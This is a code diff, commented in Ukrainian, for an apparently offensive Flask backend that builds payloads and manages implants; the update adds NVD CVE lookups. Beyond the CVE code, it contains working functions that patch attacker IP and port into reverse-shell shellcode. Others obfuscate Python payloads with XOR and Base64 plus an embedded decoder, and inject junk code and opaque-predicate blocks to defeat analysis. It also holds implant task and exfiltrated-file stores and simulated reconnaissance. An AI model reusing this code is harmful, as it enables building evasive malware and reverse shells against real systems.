@@ -1,12 +1,13 @@
-# Syntax Flask Backend - Segment SFB-CORE-1.9.7
-# Призначення: Backend на Flask з розширеним Nmap та імітацією зовнішнього API для CVE.
-# Оновлення v1.9.7:
-#   - VERSION_BACKEND оновлено до "1.9.7".
-#   - Додано MOCK_EXTERNAL_CVE_API_DB для імітації зовнішнього джерела даних CVE.
-#   - Додано функцію simulate_external_cve_api_call для імітації виклику зовнішнього API CVE.
-#   - Модифіковано conceptual_cve_lookup_be для використання simulate_external_cve_api_call
-#     замість прямого доступу до вбудованої CONCEPTUAL_CVE_DATABASE_BE.
-#   - Виправлено SyntaxError: unterminated string literal в генерації стейджера dns_beacon_c2_concept.
+# Syntax Flask Backend - Segment SFB-CORE-1.9.8
+# Призначення: Backend на Flask з розширеним Nmap та інтеграцією NVD API для CVE.
+# Оновлення v1.9.8:
+#   - VERSION_BACKEND оновлено до "1.9.8".
+#   - Додано інтеграцію з NVD API 2.0 для отримання даних CVE.
+#   - Модифіковано функцію conceptual_cve_lookup_be для використання NVD API
+#     з резервним механізмом до MOCK_EXTERNAL_CVE_API_DB та CONCEPTUAL_CVE_DATABASE_BE.
+#   - Розширено модель даних CVE для включення полів з NVD (CVSS score, vector, dates, etc.).
+#   - Додано нову функцію fetch_cves_from_nvd_api.
+#   - Додано імпорт 'requests'.
 
 from flask import Flask, request, jsonify
 from flask_cors import CORS
@@ -16,7 +17,7 @@ import re
 import random
 import string
 import time
-from datetime import datetime
+from datetime import datetime, timezone 
 import subprocess
 import shlex
 import ipaddress
@@ -26,8 +27,9 @@ import tempfile
 import os
 import uuid
 import shutil
+import requests # Додано для NVD API
 
-VERSION_BACKEND = "1.9.7" # Оновлено версію
+VERSION_BACKEND = "1.9.8" # Оновлено версію
 
 simulated_implants_be = []
 pending_tasks_for_implants = {}
@@ -40,33 +42,37 @@ CONCEPTUAL_CVE_DATABASE_BE = {
     "vsftpd 3.0.3": [{"cve_id": "CVE-2015-1419", "severity": "CRITICAL", "summary": "vsftpd 3.0.3 and earlier allows remote attackers to cause a denial of service..."}],
 }
 
-# Імітація зовнішньої бази даних CVE, доступної через "API"
+# Імітація зовнішньої бази даних CVE, доступної через "API" (залишено для резервного механізму)
 MOCK_EXTERNAL_CVE_API_DB = {
     "apache httpd 2.4.53": [
-        {"cve_id": "CVE-2022-22721", "severity": "HIGH", "summary": "X-Frame-Options header issue in Apache HTTP Server <=2.4.53 (External DB).", "source": "External Mock API"},
-        {"cve_id": "CVE-2021-44224", "severity": "MEDIUM", "summary": "Possible NULL pointer dereference in Apache HTTP Server 2.4.52 and earlier (External DB).", "source": "External Mock API"}
+        {"cve_id": "CVE-2022-22721", "severity": "HIGH", "summary": "X-Frame-Options header issue in Apache HTTP Server <=2.4.53 (Mock DB).", "source": "Mock External API"},
+        {"cve_id": "CVE-2021-44224", "severity": "MEDIUM", "summary": "Possible NULL pointer dereference in Apache HTTP Server 2.4.52 and earlier (Mock DB).", "source": "Mock External API"}
     ],
     "openssh 8.2p1": [
-        {"cve_id": "CVE-2021-41617", "severity": "MEDIUM", "summary": "Remote attacker bypass in sshd OpenSSH 6.2-8.8 (External DB).", "source": "External Mock API"}
+        {"cve_id": "CVE-2021-41617", "severity": "MEDIUM", "summary": "Remote attacker bypass in sshd OpenSSH 6.2-8.8 (Mock DB).", "source": "Mock External API"}
     ],
     "vsftpd 3.0.3": [
-        {"cve_id": "CVE-2015-1419", "severity": "CRITICAL", "summary": "Denial of service in vsftpd <=3.0.3 (External DB).", "source": "External Mock API"}
+        {"cve_id": "CVE-2015-1419", "severity": "CRITICAL", "summary": "Denial of service in vsftpd <=3.0.3 (Mock DB).", "source": "Mock External API"}
     ],
     "proftpd 1.3.5e": [
-        {"cve_id": "CVE-2019-12815", "severity": "HIGH", "summary": "Arbitrary file copy in ProFTPD <=1.3.5e (External DB).", "source": "External Mock API"}
+        {"cve_id": "CVE-2019-12815", "severity": "HIGH", "summary": "Arbitrary file copy in ProFTPD <=1.3.5e (Mock DB).", "source": "Mock External API"}
     ],
     "mysql 5.7.30": [
-        {"cve_id": "CVE-2020-14812", "severity": "HIGH", "summary": "Vulnerability in Oracle MySQL Server DDL (External DB).", "source": "External Mock API"},
-        {"cve_id": "CVE-2023-21912", "severity": "CRITICAL", "summary": "Remote code execution vulnerability in MySQL Shell (External DB).", "source": "External Mock API"}
+        {"cve_id": "CVE-2020-14812", "severity": "HIGH", "summary": "Vulnerability in Oracle MySQL Server DDL (Mock DB).", "source": "Mock External API"},
+        {"cve_id": "CVE-2023-21912", "severity": "CRITICAL", "summary": "Remote code execution vulnerability in MySQL Shell (Mock DB).", "source": "Mock External API"}
     ],
     "nginx 1.18.0": [
-        {"cve_id": "CVE-2021-23017", "severity": "HIGH", "summary": "Resolver security issue in nginx (External DB).", "source": "External Mock API"}
+        {"cve_id": "CVE-2021-23017", "severity": "HIGH", "summary": "Resolver security issue in nginx (Mock DB).", "source": "Mock External API"}
     ],
-    "microsoft iis 10.0": [ # Новий запис для демонстрації
-        {"cve_id": "CVE-2021-31166", "severity": "CRITICAL", "summary": "HTTP Protocol Stack Remote Code Execution Vulnerability in Microsoft IIS (External DB).", "source": "External Mock API"}
+    "microsoft iis 10.0": [ 
+        {"cve_id": "CVE-2021-31166", "severity": "CRITICAL", "summary": "HTTP Protocol Stack Remote Code Execution Vulnerability in Microsoft IIS (Mock DB).", "source": "Mock External API"}
     ]
 }
 
+NVD_API_BASE_URL = "https://services.nvd.nist.gov/rest/json/cves/2.0"
+NVD_API_KEY = os.environ.get("NVD_API_KEY") # Опціональний ключ API NVD з змінної середовища
+NVD_REQUEST_TIMEOUT_SECONDS = 15 # Таймаут для запитів до NVD API
+NVD_RESULTS_PER_PAGE = 20 # Кількість результатів на сторінку для NVD
 
 def initialize_simulated_implants_be():
     global simulated_implants_be, pending_tasks_for_implants, exfiltrated_file_chunks_db
@@ -149,7 +155,7 @@ CONCEPTUAL_PARAMS_SCHEMA_BE = {
             "reverse_shell_tcp_shellcode_windows_x64",
             "reverse_shell_tcp_shellcode_linux_x64"
         ],
-        "default": "DEADBEEFCAFE" # LHOST (4 bytes IP) + LPORT (2 bytes Port)
+        "default": "DEADBEEFCAFE" 
     },
     "powershell_script_url": {
         "type": str,
@@ -225,63 +231,56 @@ CONCEPTUAL_ARCHETYPE_TEMPLATES_BE = {
 def conceptual_validate_parameters_be(input_params: dict, schema: dict) -> tuple[bool, dict, list[str]]:
     validated_params = {}
     errors = []
-    # Спочатку заповнюємо validated_params значеннями з input_params або default, якщо є
     for param_name, rules in schema.items():
         if param_name in input_params:
             value_to_validate = input_params[param_name]
-            # Спроба конвертації типів для int та bool
             if rules.get("type") == int and not isinstance(value_to_validate, int):
                 try: value_to_validate = int(value_to_validate)
-                except (ValueError, TypeError): pass # Залишаємо як є, помилка типу буде пізніше
+                except (ValueError, TypeError): pass 
             elif rules.get("type") == bool and not isinstance(value_to_validate, bool):
-                 if isinstance(value_to_validate, str): # Дозволяємо 'true'/'false' для bool
+                 if isinstance(value_to_validate, str): 
                     if value_to_validate.lower() == 'true': value_to_validate = True
                     elif value_to_validate.lower() == 'false': value_to_validate = False
             validated_params[param_name] = value_to_validate
         elif "default" in rules:
-            # Перевіряємо, чи параметр не є умовно обов'язковим і відсутнім
             is_cond_req_missing = False
             if callable(rules.get("required")):
-                if rules["required"](input_params) and param_name not in input_params: # Використовуємо input_params для перевірки умови
+                if rules["required"](input_params) and param_name not in input_params: 
                     is_cond_req_missing = True
             if not is_cond_req_missing: validated_params[param_name] = rules["default"]
 
-    # Тепер валідуємо параметри, що є в validated_params
     for param_name, rules in schema.items():
         is_required_directly = rules.get("required") is True
-        # Для умовної обов'язковості використовуємо validated_params, оскільки вони вже можуть містити default значення,
-        # що впливають на умову (наприклад, payload_archetype)
         is_conditionally_required = callable(rules.get("required")) and rules["required"](validated_params if validated_params.get("payload_archetype") else input_params)
 
         if (is_required_directly or is_conditionally_required) and param_name not in validated_params:
             errors.append(f"Відсутній обов'язковий параметр: '{param_name}'.")
-            continue # Пропускаємо подальшу валідацію для цього параметра
+            continue 
 
         if param_name in validated_params:
             value = validated_params[param_name]
             if "type" in rules and not isinstance(value, rules["type"]):
                 errors.append(f"Параметр '{param_name}' має невірний тип. Очікується {rules['type'].__name__}, отримано {type(value).__name__}.")
-                continue # Якщо тип невірний, інші перевірки можуть бути некоректними
+                continue 
             if "allowed_values" in rules and value not in rules["allowed_values"]:
                 errors.append(f"Значення '{value}' для параметра '{param_name}' не є дозволеним. Дозволені: {rules['allowed_values']}.")
             if "min_length" in rules and isinstance(value, str) and len(value) < rules["min_length"]:
                  errors.append(f"Параметр '{param_name}' закороткий. Мін. довжина: {rules['min_length']}.")
-            if "allowed_range" in rules and rules.get("type") in [int, float]: # Перевіряємо тип перед діапазоном
+            if "allowed_range" in rules and rules.get("type") in [int, float]: 
                 min_val, max_val = rules["allowed_range"]
                 if not (min_val <= value <= max_val):
                     errors.append(f"Значення '{value}' для параметра '{param_name}' виходить за межі ({min_val}-{max_val}).")
-            if "validation_regex" in rules and rules.get("type") is str: # Перевіряємо тип перед regex
+            if "validation_regex" in rules and rules.get("type") is str: 
                 if not re.match(rules["validation_regex"], value):
                     errors.append(f"Значення '{value}' для параметра '{param_name}' не відповідає формату: {rules['validation_regex']}.")
     return not errors, validated_params, errors
 
-
 def xor_cipher(data_str: str, key: str) -> str:
-    if not key: key = "DefaultXOR_Key_v3" # Резервний ключ, якщо передано порожній
+    if not key: key = "DefaultXOR_Key_v3" 
     return "".join([chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(data_str)])
 
 def b64_encode_str(data_str: str) -> str:
-    return base64.b64encode(data_str.encode('latin-1')).decode('utf-8') # latin-1 для збереження байтів
+    return base64.b64encode(data_str.encode('latin-1')).decode('utf-8') 
 
 def generate_random_var_name(length=10, prefix="syn_var_"):
     return prefix + ''.join(random.choice(string.ascii_lowercase + '_') for _ in range(length))
@@ -289,14 +288,12 @@ def generate_random_var_name(length=10, prefix="syn_var_"):
 def patch_shellcode_be(shellcode_hex: str, lhost_str: str, lport_int: int, log_messages: list) -> str:
     log_messages.append(f"[SHELLCODE_PATCH_INFO] Початок патчингу шеллкоду. LHOST: {lhost_str}, LPORT: {lport_int}")
     patched_shellcode_hex = shellcode_hex
-    # Патчинг LHOST (4 байти, DEADBEEF)
-    lhost_placeholder_fixed_hex = "DEADBEEF" # Зазвичай 4 байти для IP
+    lhost_placeholder_fixed_hex = "DEADBEEF" 
     if lhost_placeholder_fixed_hex in patched_shellcode_hex:
         try:
-            # Перетворюємо IP-адресу в байтовий рядок (network byte order, big-endian)
-            ip_addr_bytes = ipaddress.ip_address(lhost_str).packed # .packed дає 4 байти для IPv4
-            ip_addr_hex = ip_addr_bytes.hex() # HEX-представлення байтів
-            if len(ip_addr_hex) == 8: # 4 байти = 8 hex символів
+            ip_addr_bytes = ipaddress.ip_address(lhost_str).packed 
+            ip_addr_hex = ip_addr_bytes.hex() 
+            if len(ip_addr_hex) == 8: 
                 patched_shellcode_hex = patched_shellcode_hex.replace(lhost_placeholder_fixed_hex, ip_addr_hex)
                 log_messages.append(f"[SHELLCODE_PATCH_SUCCESS] LHOST '{lhost_placeholder_fixed_hex}' замінено на '{ip_addr_hex}'.")
             else:
@@ -308,14 +305,12 @@ def patch_shellcode_be(shellcode_hex: str, lhost_str: str, lport_int: int, log_m
     else:
         log_messages.append(f"[SHELLCODE_PATCH_INFO] Стандартний 4-байтовий заповнювач LHOST ('{lhost_placeholder_fixed_hex}') не знайдено в шеллкоді.")
 
-    # Патчинг LPORT (2 байти, CAFE)
-    lport_placeholder_fixed_hex = "CAFE" # Зазвичай 2 байти для порту
+    lport_placeholder_fixed_hex = "CAFE" 
     if lport_placeholder_fixed_hex in patched_shellcode_hex:
         try:
-            # Перетворюємо порт в 2-байтовий рядок (network byte order, big-endian)
-            lport_bytes = socket.htons(lport_int).to_bytes(2, byteorder='big') # htons для network order, потім в байти
-            lport_hex_network_order = lport_bytes.hex() # HEX-представлення байтів
-            if len(lport_hex_network_order) == 4: # 2 байти = 4 hex символи
+            lport_bytes = socket.htons(lport_int).to_bytes(2, byteorder='big') 
+            lport_hex_network_order = lport_bytes.hex() 
+            if len(lport_hex_network_order) == 4: 
                 patched_shellcode_hex = patched_shellcode_hex.replace(lport_placeholder_fixed_hex, lport_hex_network_order)
                 log_messages.append(f"[SHELLCODE_PATCH_SUCCESS] LPORT '{lport_placeholder_fixed_hex}' замінено на '{lport_hex_network_order}'.")
             else:
@@ -330,56 +325,48 @@ def patch_shellcode_be(shellcode_hex: str, lhost_str: str, lport_int: int, log_m
     return patched_shellcode_hex
 
 def obfuscate_string_literals_in_python_code(code: str, key: str, log_messages: list) -> str:
-    # Регулярний вираз для знаходження рядкових літералів (одинарні, подвійні, потрійні лапки, raw, unicode)
-    # Виключаємо f-string, оскільки їх обфускація може зламати логіку
     string_literal_regex = r"""(?<![a-zA-Z0-9_])(?:u?r?(?:\"\"\"([^\"\\]*(?:\\.[^\"\\]*)*)\"\"\"|'''([^'\\]*(?:\\.[^'\\]*)*)'''|\"([^\"\\]*(?:\\.[^\"\\]*)*)\"|'([^'\\]*(?:\\.[^'\\]*)*)'))"""
     found_literals_matches = list(re.finditer(string_literal_regex, code, re.VERBOSE))
     if not found_literals_matches:
         log_messages.append("[METAMORPH_INFO] Рядкових літералів для обфускації не знайдено.")
         return code
 
-    # Генеруємо унікальне ім'я для функції-декодера
     decoder_func_name = generate_random_var_name(prefix="unveil_")
-    # Код функції-декодера (XOR + Base64)
     decoder_func_code = f"""
-import base64 as b64_rt_decoder # Використовуємо псевдонім, щоб уникнути конфліктів
+import base64 as b64_rt_decoder 
 def {decoder_func_name}(s_b64, k_s):
     try:
-        d_b = b64_rt_decoder.b64decode(s_b64.encode('utf-8')) # Декодуємо з Base64
-        d_s = d_b.decode('latin-1') # Декодуємо байти в рядок (latin-1 для збереження всіх байтів)
-        o_c = [] # Список для символів розшифрованого рядка
-        for i_c in range(len(d_s)): # XOR-дешифрування
+        d_b = b64_rt_decoder.b64decode(s_b64.encode('utf-8')) 
+        d_s = d_b.decode('latin-1') 
+        o_c = [] 
+        for i_c in range(len(d_s)): 
             o_c.append(chr(ord(d_s[i_c]) ^ ord(k_s[i_c % len(k_s)])))
-        return "".join(o_c) # Повертаємо розшифрований рядок
-    except Exception: return s_b64 # У випадку помилки повертаємо оригінальний (закодований) рядок
+        return "".join(o_c) 
+    except Exception: return s_b64 
 """
     obfuscated_count = 0
-    definitions_to_add = [] # Список визначень обфускованих рядків
-    replacements = [] # Список для збереження позицій та імен змінних для заміни
+    definitions_to_add = [] 
+    replacements = [] 
 
     for match in found_literals_matches:
-        literal_group = next(g for g in match.groups() if g is not None) # Отримуємо сам рядок
-        full_match_str = match.group(0) # Повний збіг, включаючи лапки та префікси
-
-        # Пропускаємо дуже короткі рядки, ключові слова Python, ідентифікатори,
-        # рядки, що містять форматування або схожі на частини коду, та f-рядки
+        literal_group = next(g for g in match.groups() if g is not None) 
+        full_match_str = match.group(0) 
         python_keywords = set(["False", "None", "True", "and", "as", "assert", "async", "await", "break", "class", "continue", "def", "del", "elif", "else", "except", "finally", "for", "from", "global", "if", "import", "in", "is", "lambda", "nonlocal", "not", "or", "pass", "raise", "return", "try", "while", "with", "yield", "__main__", "__name__"])
         if len(literal_group) < 3 or literal_group in python_keywords or literal_group.isidentifier() or \
            '{' in literal_group or '}' in literal_group or '%' in literal_group or \
-           full_match_str.startswith("f\"") or full_match_str.startswith("f'"): # Явна перевірка на f-string
+           full_match_str.startswith("f\"") or full_match_str.startswith("f'"): 
             continue
 
         obfuscated_s_xor = xor_cipher(literal_group, key)
         obfuscated_s_b64 = b64_encode_str(obfuscated_s_xor)
         var_name = generate_random_var_name(prefix="obf_str_")
-        definitions_to_add.append(f"{var_name} = {decoder_func_name}(\"{obfuscated_s_b64}\", OBFUSCATION_KEY_EMBEDDED)") # Використовуємо глобальний ключ
-        replacements.append((match.span(), var_name)) # Зберігаємо початкову та кінцеву позицію оригінального рядка
+        definitions_to_add.append(f"{var_name} = {decoder_func_name}(\"{obfuscated_s_b64}\", OBFUSCATION_KEY_EMBEDDED)") 
+        replacements.append((match.span(), var_name)) 
         obfuscated_count +=1
 
     if obfuscated_count > 0:
-        # Вставляємо функцію-декодер та визначення змінних на початку коду (після імпортів)
         import_lines_end_pos = 0
-        for match_imp in re.finditer(r"^(?:import|from) .*?(?:\n|$)", code, re.MULTILINE): # Знаходимо кінець блоку імпортів
+        for match_imp in re.finditer(r"^(?:import|from) .*?(?:\n|$)", code, re.MULTILINE): 
             import_lines_end_pos = match_imp.end()
 
         code_before_imports_and_globals = code[:import_lines_end_pos]
@@ -387,22 +374,19 @@ def {decoder_func_name}(s_b64, k_s):
         definitions_block = "\n" + "\n".join(definitions_to_add) + "\n"
         code_with_definitions = code_after_decoder_insertion + definitions_block
 
-        # Замінюємо рядкові літерали на виклики змінних у решті коду
-        # Потрібно робити заміни з кінця, щоб не порушити індекси
-        code_original_main_logic = code[import_lines_end_pos:] # Частина коду після імпортів
+        code_original_main_logic = code[import_lines_end_pos:] 
         temp_main_logic = code_original_main_logic
         for (start_orig, end_orig), var_name_rep in sorted(replacements, key=lambda x: x[0][0], reverse=True):
-            # Перераховуємо індекси відносно початку code_original_main_logic
             start_rel = start_orig - import_lines_end_pos
             end_rel = end_orig - import_lines_end_pos
-            if start_rel >= 0: # Переконуємося, що індекс не від'ємний (на випадок, якщо імпортів не було)
+            if start_rel >= 0: 
                  temp_main_logic = temp_main_logic[:start_rel] + var_name_rep + temp_main_logic[end_rel:]
 
         modified_code = code_with_definitions + temp_main_logic
         log_messages.append(f"[METAMORPH_INFO] Обфусковано {obfuscated_count} рядкових літералів. Функція-декодер: {decoder_func_name}")
     else:
         log_messages.append("[METAMORPH_INFO] Рядкових літералів для обфускації не знайдено (після фільтрації).")
-        modified_code = code # Повертаємо оригінальний код, якщо нічого не обфусковано
+        modified_code = code 
     return modified_code
 
 def apply_advanced_cfo_be(code_lines: list, log_messages: list) -> str:
@@ -411,11 +395,10 @@ def apply_advanced_cfo_be(code_lines: list, log_messages: list) -> str:
     junk_code_count = 0
 
     for line_idx, line in enumerate(code_lines):
-        transformed_code_list.append(line) # Додаємо оригінальний рядок
-        current_indent = line[:len(line) - len(line.lstrip())] # Визначаємо поточний відступ
+        transformed_code_list.append(line) 
+        current_indent = line[:len(line) - len(line.lstrip())] 
 
-        # 1. Вставка простого сміттєвого коду (зменшена ймовірність)
-        if random.random() < 0.15 and line.strip() and not line.strip().startswith("#") and len(line.strip()) > 3 : # Не для порожніх, коментарів, коротких
+        if random.random() < 0.15 and line.strip() and not line.strip().startswith("#") and len(line.strip()) > 3 : 
             junk_var1 = generate_random_var_name(prefix="jnk_var_")
             junk_var2 = generate_random_var_name(prefix="tmp_dat_")
             junk_ops = [
@@ -427,48 +410,45 @@ def apply_advanced_cfo_be(code_lines: list, log_messages: list) -> str:
             transformed_code_list.append(random.choice(junk_ops))
             junk_code_count +=1
 
-        # 2. Вставка блоків Control Flow Obfuscation (CFO) (зменшена ймовірність)
-        # Пропускаємо для рядків, що визначають функції, класи, __main__, імпорти, return, або закінчуються на ':' (початок блоку),
-        # або є рядком OBFUSCATION_KEY_EMBEDDED
         if random.random() < 0.25 and line.strip() and \
            not line.strip().startswith("#") and \
            "def " not in line and "class " not in line and \
            "if __name__" not in line and "import " not in line and \
            "return " not in line and not line.strip().endswith(":") and \
-           not line.strip().startswith("OBFUSCATION_KEY_EMBEDDED"): # Додано перевірку на ключ
+           not line.strip().startswith("OBFUSCATION_KEY_EMBEDDED"): 
 
             r1, r2 = random.randint(1,100), random.randint(1,100)
-            cfo_type = random.randint(1, 6) # Різні типи CFO блоків
+            cfo_type = random.randint(1, 6) 
             cfo_block_lines = [f"{current_indent}# --- CFO Block Type {cfo_type} Inserted ---"]
 
-            if cfo_type == 1: # Непрозорий предикат (завжди True)
+            if cfo_type == 1: 
                 cfo_block_lines.append(f"{current_indent}if {r1} * {random.randint(1,5)} > {r1-1000}: # Opaque True {random.randint(0,100)}")
                 cfo_block_lines.append(f"{current_indent}    {generate_random_var_name(prefix='cfo_v1_')} = {r1} ^ {r2}")
                 cfo_block_lines.append(f"{current_indent}else:")
                 cfo_block_lines.append(f"{current_indent}    {generate_random_var_name(prefix='dead1_')} = {r1}+{r2} # Dead code")
-            elif cfo_type == 2: # Непрозорий предикат (завжди False, виконується else)
+            elif cfo_type == 2: 
                 cfo_block_lines.append(f"{current_indent}if str({r1}) == str({r1 + 1}): # Opaque False {random.randint(0,100)}")
                 cfo_block_lines.append(f"{current_indent}    {generate_random_var_name(prefix='dead2_')} = {r1}-{r2} # Dead code")
                 cfo_block_lines.append(f"{current_indent}else:")
                 cfo_block_lines.append(f"{current_indent}    {generate_random_var_name(prefix='cfo_v2_')} = {r2} | {r1}")
-            elif cfo_type == 3: # Сміттєвий цикл
+            elif cfo_type == 3: 
                 loop_var = generate_random_var_name(1, '_lp')
                 cfo_block_lines.append(f"{current_indent}for {loop_var} in range({random.randint(1,3)}): # Junk Loop {random.randint(0,100)}")
                 cfo_block_lines.append(f"{current_indent}    {generate_random_var_name(prefix='iter_jnk_')} = str({loop_var} * {r1}) + \"_{r2}\"")
                 cfo_block_lines.append(f"{current_indent}    if {loop_var} > 5: break # Unlikely break")
-            elif cfo_type == 4: # Складний непрозорий предикат
+            elif cfo_type == 4: 
                 v_a, v_b = generate_random_var_name(prefix="cfa_op_"), generate_random_var_name(prefix="cfb_op_")
                 cfo_block_lines.append(f"{current_indent}{v_a} = ({r1} << {random.randint(0,2)}) + {random.randint(0,10)}")
-                cfo_block_lines.append(f"{current_indent}{v_b} = {v_a} ^ {r2 if r2 !=0 else 1}") # Уникаємо ділення на нуль
+                cfo_block_lines.append(f"{current_indent}{v_b} = {v_a} ^ {r2 if r2 !=0 else 1}") 
                 cfo_block_lines.append(f"{current_indent}if {v_b} % ({r2 if r2 !=0 else 1}) != {v_a} % ({r2 if r2 !=0 else 1}): # Opaque True (complex) {random.randint(0,100)}")
                 cfo_block_lines.append(f"{current_indent}    pass")
-            elif cfo_type == 5: # Вкладені умови з мертвою гілкою
+            elif cfo_type == 5: 
                 cfo_block_lines.append(f"{current_indent}if True: # Outer always true {random.randint(0,100)}")
                 cfo_block_lines.append(f"{current_indent}    if {r1} < {r1 // 2 if r1 > 0 else -1}: # Inner likely false")
                 cfo_block_lines.append(f"{current_indent}        {generate_random_var_name(prefix='dead_path_')} = 'unreachable'")
                 cfo_block_lines.append(f"{current_indent}    else:")
                 cfo_block_lines.append(f"{current_indent}        pass # Real path")
-            elif cfo_type == 6: # Виклик простої сміттєвої функції
+            elif cfo_type == 6: 
                  func_name_cfo = generate_random_var_name(prefix="cfo_sub_")
                  sub_var_name_cfo = generate_random_var_name(prefix='sub_var_')
                  cfo_block_lines.append(f"{current_indent}def {func_name_cfo}():")
@@ -483,7 +463,6 @@ def apply_advanced_cfo_be(code_lines: list, log_messages: list) -> str:
     log_messages.append(f"[METAMORPH_DEBUG] Застосовано CFO блоків: {cfo_applied_count}, Сміттєвого коду: {junk_code_count}.")
     return "\n".join(transformed_code_list)
 
-
 def get_service_name_be(port: int) -> str:
     services = { 21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP", 53: "DNS", 80: "HTTP", 110: "POP3", 443: "HTTPS", 3306: "MySQL", 3389: "RDP", 8080: "HTTP-Alt" }
     return services.get(port, "Unknown")
@@ -494,11 +473,11 @@ def simulate_port_scan_be(target: str) -> tuple[list[str], str]:
     common_ports = [21, 22, 23, 25, 53, 80, 110, 135, 139, 443, 445, 1433, 3306, 3389, 5432, 5900, 8000, 8080, 8443]
     open_ports_found = []
     for port in common_ports:
-        time.sleep(random.uniform(0.01, 0.05)) # Імітація затримки
-        if random.random() < 0.3: # Імовірність, що порт відкритий
+        time.sleep(random.uniform(0.01, 0.05)) 
+        if random.random() < 0.3: 
             service_name = get_service_name_be(port)
             banner = ""
-            if random.random() < 0.6: # Імовірність наявності банера
+            if random.random() < 0.6: 
                 banner_version = f"v{random.randint(1,5)}.{random.randint(0,9)}"
                 possible_banners = [f"OpenSSH_{banner_version}", f"Apache httpd {banner_version}", f"Microsoft-IIS/{banner_version}", "nginx", f"ProFTPD {banner_version}", f"vsftpd {banner_version}", f"MySQL {banner_version}", f"PostgreSQL {banner_version}"]
                 banner = f" (Banner: {random.choice(possible_banners)})"
@@ -512,11 +491,11 @@ def simulate_osint_email_search_be(target_domain: str) -> tuple[list[str], str]:
     log = [f"[RECON_BE_INFO] Імітація OSINT пошуку email для домену: {target_domain}"]
     results_text_lines = [f"Результати OSINT пошуку Email для домену: {target_domain}"]
     domain_parts = target_domain.split('.')
-    main_domain = ".".join(domain_parts[-2:]) if len(domain_parts) > 2 else target_domain # Отримуємо основний домен (example.com з sub.example.com)
+    main_domain = ".".join(domain_parts[-2:]) if len(domain_parts) > 2 else target_domain 
     common_names = ["info", "support", "admin", "contact", "sales", "hr", "abuse", "webmaster"]
     first_names = ["john.doe", "jane.smith", "peter.jones", "susan.lee", "michael.brown"]
     found_emails = []
-    for _ in range(random.randint(1, 5)): # Генеруємо кілька email-адрес
+    for _ in range(random.randint(1, 5)): 
         email = f"{random.choice(common_names)}@{main_domain}" if random.random() < 0.7 else f"{random.choice(first_names)}@{main_domain}"
         if email not in found_emails: found_emails.append(email)
     if found_emails: results_text_lines.extend([f"  Знайдено Email: {email}" for email in found_emails])
@@ -527,18 +506,17 @@ def simulate_osint_email_search_be(target_domain: str) -> tuple[list[str], str]:
 def simulate_osint_subdomain_search_be(target_domain: str) -> tuple[list[str], str]:
     log = [f"[RECON_BE_INFO] Імітація OSINT пошуку субдоменів для домену: {target_domain}"]
     results_text_lines = [f"Результати OSINT пошуку Субдоменів для домену: {target_domain}"]
-    cleaned_domain = re.sub(r"^(www|ftp|mail)\.", "", target_domain, flags=re.IGNORECASE) # Видаляємо поширені префікси
+    cleaned_domain = re.sub(r"^(www|ftp|mail)\.", "", target_domain, flags=re.IGNORECASE) 
     common_subdomains_prefixes = [
         "www", "mail", "ftp", "webmail", "cpanel", "blog", "dev", "stage", "test", "api",
         "shop", "store", "secure", "vpn", "remote", "portal", "owa", "autodiscover",
         "admin", "dashboard", "app", "beta", "alpha", "db", "assets", "static", "cdn",
         "intranet", "support", "helpdesk", "status", "git", "svn", "m", "mta", "ns1", "ns2"
     ]
-    found_subdomains_list = set() # Використовуємо set для уникнення дублікатів
+    found_subdomains_list = set() 
     for sub_prefix in common_subdomains_prefixes:
-        if random.random() < 0.20: # Імовірність знаходження кожного субдомену
+        if random.random() < 0.20: 
             found_subdomains_list.add(f"{sub_prefix}.{cleaned_domain}")
-    # Додамо кілька більш "складних" або випадкових субдоменів
     for _ in range(random.randint(0, 2)):
         prefix_part1 = random.choice(["data", "svc", "internal", "ext", "prod", "dev-app", "user"])
         prefix_part2 = random.choice(["01", "02", "new", "sys", str(random.randint(1,3))])
@@ -546,7 +524,7 @@ def simulate_osint_subdomain_search_be(target_domain: str) -> tuple[list[str], s
             found_subdomains_list.add(f"{prefix_part1}-{prefix_part2}.{cleaned_domain}")
         else:
             found_subdomains_list.add(f"{prefix_part1}{random.randint(1,9)}.{cleaned_domain}")
-    if not found_subdomains_list and cleaned_domain: # Якщо нічого не знайдено, додамо хоча б www та mail
+    if not found_subdomains_list and cleaned_domain: 
         found_subdomains_list.add(f"www.{cleaned_domain}")
         found_subdomains_list.add(f"mail.{cleaned_domain}")
 
@@ -570,7 +548,6 @@ def parse_nmap_xml_output_for_services(nmap_xml_output: str, log_messages: list)
             address_node = host_node.find('address')
             host_ip = address_node.get('addr') if address_node is not None else "N/A"
             
-            # Парсинг інформації про ОС
             os_node = host_node.find('os')
             if os_node is not None:
                 for osmatch_node in os_node.findall('osmatch'):
@@ -587,7 +564,6 @@ def parse_nmap_xml_output_for_services(nmap_xml_output: str, log_messages: list)
                     })
                     log_messages.append(f"[NMAP_XML_PARSE_OS] Знайдено ОС: {os_name} (Точність: {accuracy}) для хоста {host_ip}")
 
-            # Парсинг інформації про порти та сервіси
             ports_node = host_node.find('ports')
             if ports_node is None:
                 continue
@@ -643,14 +619,12 @@ def parse_nmap_xml_output_for_services(nmap_xml_output: str, log_messages: list)
                 service_key_for_cve = product_name.lower().strip() if product_name else service_name.lower().strip()
                 if version_number:
                     service_key_for_cve += f" {version_number.lower().strip()}"
-                # Додаткова логіка для вилучення версії з extrainfo, якщо product порожній
-                if not product_name and service_name != 'unknown': # Якщо product порожній, але є service_name
+                if not product_name and service_name != 'unknown': 
                      service_key_for_cve = service_name.lower().strip()
-                     if not version_number and extrainfo: # І якщо немає версії, але є extrainfo
-                         version_match_extra = re.search(r"(\d+\.[\d\.\w-]+)", extrainfo) # Шукаємо щось схоже на версію
+                     if not version_number and extrainfo: 
+                         version_match_extra = re.search(r"(\d+\.[\d\.\w-]+)", extrainfo) 
                          if version_match_extra:
                              service_key_for_cve += f" {version_match_extra.group(1).lower().strip()}"
-
 
                 parsed_services.append({
                     "host_ip": host_ip, "port": port_id, "protocol": protocol,
@@ -661,7 +635,6 @@ def parse_nmap_xml_output_for_services(nmap_xml_output: str, log_messages: list)
                     "scripts": scripts_output
                 })
         
-        # Парсинг скриптів на рівні хоста (не прив'язаних до порту)
         for host_node in root.findall('host'):
             host_ip = host_node.find('address').get('addr') if host_node.find('address') is not None else "N/A"
             hostscript_node = host_node.find('hostscript')
@@ -702,7 +675,6 @@ def parse_nmap_xml_output_for_services(nmap_xml_output: str, log_messages: list)
                         "host_scripts": host_scripts_output
                     })
 
-
